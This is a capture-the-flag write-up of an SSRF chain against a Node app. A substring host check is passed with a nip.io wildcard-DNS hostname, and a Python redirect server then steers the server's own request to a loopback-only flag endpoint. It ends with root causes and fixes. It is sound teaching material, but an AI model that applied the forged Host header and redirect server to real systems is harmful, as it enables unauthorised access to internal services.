# Challenge Write-Up: philosofy

**Author** : 0xsila

## Challenge Name
**philosofy**

## Vulnerability Chain

**Host header allow-list bypass (substring check) → wildcard-DNS domain pointing at an attacker server → SSRF → open redirect back to localhost → flag**

---

## Challenge Overview

The app has one route, `/`. On every request it reads the host the client claims to be using (preferring `X-Forwarded-Host`, falling back to `Host`), and if that host passes a check, the server itself makes a request to `http://<that host>/cdn/content.html` and echoes the response back in the page.

```js
function getHost(req) {
  const xfHost = req.headers["x-forwarded-host"];
  const host = req.headers["host"] || "";
  if (xfHost && xfHost.trim() !== "") return xfHost.split(",")[0].trim();
  return host;
}

function isAllowedHost(host) {
  return host.split(":")[0].includes("nexus");
}
```

The check looks reasonable at first: only a host that "belongs to nexus" is allowed to be fetched. The bug is the word **includes**. The allow-list isn't "the host is `ctf.nexus-security.club`", it's "the host contains the substring `nexus` anywhere". Any hostname with `nexus` in it passes, no matter who controls where it resolves to.

There's also a second piece on the same server: a `/flag.txt` route that only answers the request if it comes from `127.0.0.1` / `::1`.

```js
app.get("/flag.txt", (req, res) => {
  const ip = req.socket.remoteAddress;
  if (ip !== "127.0.0.1" && ip !== "::1" && ip !== "::ffff:127.0.0.1") {
    return res.status(403).send("forbidden");
  }
  return res.send(FLAG);
});
```

Put the two together: if I can make the server's own outgoing request end up at `http://127.0.0.1:3000/flag.txt`, the IP check sees the request coming from the server talking to itself, and hands me the flag back inside the page I requested.

---

## Steps

### 1. Beat the string check with a wildcard-DNS hostname

`isAllowedHost` only checks for the substring `nexus`. I don't need a `nexus`-owned domain, I need any domain name that *contains* that word and that I can point wherever I want.

Services like `nip.io` / `sslip.io` do exactly that: they're wildcard DNS that resolve any hostname of the form `<anything>.<ip>.nip.io` to `<ip>`. So I registered nothing, I just picked a hostname:

```
nexus.<my-server-ip>.nip.io
```

This string contains `nexus`, so `isAllowedHost()` says yes. And it resolves straight to a VPS I control.

I sent that as the `Host` header (`X-Forwarded-Host` works too, and takes priority):

```http
GET / HTTP/1.1
Host: nexus.<my-server-ip>.nip.io
```

### 2. Make the server fetch my domain

The app builds the request from the same header I just controlled:

```js
const url = `http://${host}/cdn/content.html`;
const r = await axios.get(url, { maxRedirects: 5, timeout: 5000, ... });
```

So the server now does `GET http://nexus.<my-server-ip>.nip.io/cdn/content.html`, which is a request to my own machine. Classic SSRF: I asked the app to visit a URL, and the "allow-list" didn't actually restrict *where* that URL could point, only what string had to appear in it.

### 3. Turn the SSRF into access to localhost with a redirect

My server doesn't need to serve `content.html`. It just needs to answer with a redirect, and `axios` was configured with `maxRedirects: 5`, so it will follow it automatically:

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(301)
        self.send_header("Location", "http://127.0.0.1:3000/flag.txt")
        self.send_header("Content-Length", "0")
        self.end_headers()
    def log_message(self, *a):
        pass

HTTPServer(("0.0.0.0", 80), Handler).serve_forever()
```

The app's outgoing request hits my server, my server answers `301 → http://127.0.0.1:3000/flag.txt`, and axios follows that redirect **from the app's own network position**, not from mine. `127.0.0.1` there is the challenge server itself.

### 4. Collect the flag

The redirected request lands on `/flag.txt`, running on the same host, so `req.socket.remoteAddress` is `127.0.0.1`. The IP check passes, the flag is returned, and the app drops it straight into the page:

```html
<pre>nexus{...}</pre>
```

---

## Why this worked

- **The allow-list checked the wrong thing.** `includes("nexus")` is a substring test, not a host/ownership test. A hostname I fully control can still "contain" the trusted word.
- **The IP allow-list on `/flag.txt` trusted the position of the request, not its origin.** It only ever sees "did this connection come from 127.0.0.1", so it has no way to tell a legitimate internal call from an SSRF that was redirected there.
- **Following redirects turns a one-shot SSRF into an open-ended one.** The first request has to pass the host check; the redirect target doesn't have to pass anything.

## Fix

- Validate the host against an exact allow-list (`===`, or a proper suffix match like `host === "nexus-security.club" || host.endsWith(".nexus-security.club")`), never a plain substring check.
- Resolve the host and block requests to private/loopback ranges (`127.0.0.0/8`, `::1`, link-local, etc.) before *and after* following redirects, or disable automatic redirects entirely and re-validate every hop.
- Don't trust `remoteAddress` alone to gate an internal endpoint; an SSRF from the same host will always look local.

**Lesson:** when you see `.includes(trustedWord)` guarding what the server is allowed to fetch, ask what else can contain that word. A wildcard-DNS service that bakes an attacker-controlled IP into a hostname you pick (`nip.io`, `sslip.io`, and friends) is the standard way to pass that kind of check while still pointing exactly where you want.
